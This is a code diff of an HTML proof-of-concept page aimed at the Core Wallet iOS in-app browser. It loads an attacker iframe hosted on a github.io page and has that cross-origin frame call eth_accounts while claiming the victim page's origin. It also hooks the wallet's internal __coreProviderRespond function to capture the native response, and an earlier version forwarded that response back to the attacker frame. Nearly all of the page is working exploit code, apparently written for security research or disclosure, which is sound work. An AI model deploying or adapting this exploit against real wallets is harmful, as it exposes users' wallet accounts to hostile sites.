@@ -1,47 +1,35 @@
 <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>VCTM</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Core Wallet iOS - Authorization Reuse</title>
 
-  <style>
-    body {
-      margin: 20px;
-      font: 16px -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #fff;
-      color: #111;
-      line-height: 1.5;
-    }
-
-    button {
-      padding: 10px 14px;
-      margin: 6px 0;
-      font-size: 15px;
-    }
-
-    pre {
-      white-space: pre-wrap;
-      overflow-wrap: anywhere;
-      padding: 12px;
-      border: 1px solid #ccc;
-      background: #f7f7f7;
-    }
-
-    .bad {
-      border: 2px solid #b00000;
-      padding: 12px;
-      color: #b00000;
-      font-weight: 700;
-      margin: 12px 0;
-    }
-
-    iframe {
-      width: 100%;
-      height: 60px;
-      border: 1px solid #ccc;
-    }
-  </style>
+<style>
+body{
+  margin:20px;
+  background:#fff;
+  color:#111;
+  font:16px -apple-system,BlinkMacSystemFont,sans-serif;
+  line-height:1.5
+}
+button{padding:10px 14px;margin:6px 0}
+pre{
+  white-space:pre-wrap;
+  overflow-wrap:anywhere;
+  padding:12px;
+  background:#f7f7f7;
+  border:1px solid #ccc
+}
+#verdict{
+  margin:12px 0;
+  padding:12px;
+  border:2px solid #b00000;
+  color:#b00000;
+  font-weight:bold
+}
+iframe{width:100%;height:60px;border:1px solid #ccc}
+</style>
 </head>
 
 <body>
@@ -49,26 +37,28 @@
 <h2>Core Wallet iOS - Cross-Origin Authorization Reuse</h2>
 
 <p>
-<b>Victim / Origin A:</b><br>
-<span id="victimOrigin"></span>
+Victim / Origin A:<br>
+<b id="originA"></b>
 </p>
 
 <p>
-First connect Origin A normally. Then test whether cross-origin Origin B
-can reuse A's wallet authorization.
+Attacker / Origin B:<br>
+<b>https://azza1231.github.io</b>
 </p>
 
 <button id="connect">
-  1. Connect Origin A normally
+1. Connect Origin A normally
 </button>
+
+<br>
 
 <button id="attack" disabled>
-  2. Ask Origin B to read authorized accounts as A
+2. Origin B calls eth_accounts as Origin A
 </button>
 
-<div id="verdict" hidden class="bad"></div>
+<div id="verdict" hidden></div>
 
-<pre id="log">Waiting...</pre>
+<pre id="log">Loading attacker iframe...</pre>
 
 <iframe id="frame"></iframe>
 
@@ -76,24 +66,25 @@ can reuse A's wallet authorization.
 const ATTACKER =
   'https://azza1231.github.io/pocpoc/attacker.html';
 
+const TEST_ID = 733731;
+
 const frame = document.getElementById('frame');
 const log = document.getElementById('log');
 const verdict = document.getElementById('verdict');
+const attackButton = document.getElementById('attack');
 
-const attackerOrigin =
-  new URL(ATTACKER).origin;
+const attackerOrigin = new URL(ATTACKER).origin;
 
-document.getElementById('victimOrigin').textContent =
+document.getElementById('originA').textContent =
   location.origin;
+
 
 function print(text = '') {
   log.textContent += text + '\n';
 }
 
 
-/*
- * Load the real cross-origin attacker iframe.
- */
+// Load Origin B
 const child = new URL(ATTACKER);
 
 child.searchParams.set(
@@ -104,162 +95,147 @@ child.searchParams.set(
 frame.src = child.href;
 
 
-/*
- * Step 1:
- * Origin A connects normally using the official provider.
- */
+addEventListener('message', event => {
+  if (event.source !== frame.contentWindow) return;
+  if (event.origin !== attackerOrigin) return;
+
+  if (event.data?.type === 'READY') {
+    log.textContent =
+`Browser-confirmed Origin B:
+${event.origin}
+
+Victim Origin A:
+${location.origin}
+
+Ready. Connect Origin A first.`;
+  }
+
+  if (event.data?.type === 'REQUEST_SENT') {
+    print('');
+    print('Origin B sent native request:');
+    print('Method: eth_accounts');
+    print('Actual origin: ' + event.origin);
+    print('Claimed origin: ' + location.origin);
+    print('Request ID: ' + TEST_ID);
+  }
+});
+
+
+// Step 1
 document.getElementById('connect').onclick = async () => {
+
   if (!window.ethereum?.request) {
-    print('Core provider unavailable.');
+    print('ERROR: Core provider unavailable.');
     return;
   }
 
   try {
     print('');
-    print('Origin A requests eth_requestAccounts normally...');
+    print('Connecting Origin A normally...');
 
     const accounts =
       await window.ethereum.request({
         method: 'eth_requestAccounts'
       });
 
-    print('Origin A connected.');
     print(
-      'Accounts visible to A: ' +
+      'Origin A authorized accounts: ' +
       JSON.stringify(accounts)
     );
 
-    document.getElementById('attack').disabled = false;
+    attackButton.disabled = false;
 
-  } catch (error) {
+  } catch (e) {
     print(
-      'Origin A connection failed: ' +
-      String(error?.message || error)
+      'Connect failed: ' +
+      String(e?.message || e)
     );
   }
 };
 
 
-/*
- * Step 2:
- * Tell B to query eth_accounts while claiming A.
- */
-document.getElementById('attack').onclick = () => {
+// Step 2
+attackButton.onclick = () => {
+
   print('');
-  print('Asking cross-origin Origin B to send eth_accounts...');
-  print('Actual iframe origin: ' + attackerOrigin);
-  print('Claimed origin: ' + location.origin);
+  print('=== CROSS-ORIGIN TEST ===');
+
+  /*
+   * Install observer NOW, after Core provider exists.
+   */
+  if (typeof window.__coreProviderRespond !== 'function') {
+    print('ERROR: __coreProviderRespond unavailable.');
+    return;
+  }
+
+
+  if (!window.__reuseObserverInstalled) {
+
+    const original =
+      window.__coreProviderRespond;
+
+    window.__coreProviderRespond =
+      function(id, error, result) {
+
+        if (id === TEST_ID) {
+
+          print('');
+          print('Native response for Origin-B request:');
+          print(
+            JSON.stringify({
+              id,
+              error,
+              result
+            }, null, 2)
+          );
+
+
+          if (
+            !error &&
+            Array.isArray(result) &&
+            result.length > 0
+          ) {
+
+            verdict.hidden = false;
+
+            verdict.textContent =
+              'VULNERABLE: Cross-origin Origin B obtained accounts using Origin A authorization.';
+
+            print('');
+            print('IMPACT PROVEN:');
+            print(
+              'Origin B received the wallet account authorized for Origin A.'
+            );
+
+          } else {
+
+            print('');
+            print(
+              'Authorization reuse NOT proven on this run.'
+            );
+          }
+        }
+
+        return original.apply(this, arguments);
+    };
+
+    window.__reuseObserverInstalled = true;
+  }
+
+
+  print('Asking Origin B to call eth_accounts...');
+  print('Actual Origin B: ' + attackerOrigin);
+  print('Claimed Origin A: ' + location.origin);
+
 
   frame.contentWindow.postMessage(
     {
-      type: 'READ_ACCOUNTS_AS_A'
+      type: 'READ_ACCOUNTS',
+      id: TEST_ID
     },
     attackerOrigin
   );
 };
-
-
-if (
-  typeof window.__coreProviderRespond === 'function' &&
-  !window.__authReuseObserver
-) {
-  const original =
-    window.__coreProviderRespond;
-
-  window.__coreProviderRespond =
-    function(id, error, result) {
-
-      if (id === 733731) {
-        frame.contentWindow.postMessage(
-          {
-            type: 'NATIVE_RESULT',
-            id,
-            error,
-            result
-          },
-          attackerOrigin
-        );
-
-        if (
-          !error &&
-          Array.isArray(result) &&
-          result.length > 0
-        ) {
-          verdict.hidden = false;
-
-          verdict.textContent =
-            'VULNERABLE: Origin B reused Origin A wallet authorization and obtained the authorized account response.';
-
-          print('');
-          print(
-            'Attacker request result: ' +
-            JSON.stringify(result)
-          );
-        }
-      }
-
-      return original.apply(this, arguments);
-    };
-
-  window.__authReuseObserver = true;
-}
-
-/*
- * Browser-authenticated responses from B.
- */
-addEventListener('message', event => {
-  if (event.source !== frame.contentWindow)
-    return;
-
-  if (event.origin !== attackerOrigin)
-    return;
-
-  const data = event.data;
-
-  if (!data)
-    return;
-
-
-  if (data.type === 'READY') {
-    log.textContent =
-`Browser-confirmed attacker Origin B:
-${event.origin}
-
-Victim Origin A:
-${location.origin}
-
-Ready.`;
-  }
-
-
-  if (data.type === 'ATTACK_RESULT') {
-    print('');
-    print('Origin B native response:');
-    print(JSON.stringify(data, null, 2));
-
-    if (
-      Array.isArray(data.result) &&
-      data.result.length > 0
-    ) {
-      verdict.hidden = false;
-
-      verdict.textContent =
-        'VULNERABLE: Cross-origin Origin B received wallet accounts while impersonating already-authorized Origin A.';
-
-      print('');
-      print('IMPACT PROVEN:');
-      print(
-        'Origin B reused the wallet authorization belonging to Origin A.'
-      );
-
-    } else {
-      print('');
-      print(
-        'NOT PROVEN: B did not receive an authorized account list.'
-      );
-    }
-  }
-});
 </script>
 
 </body>
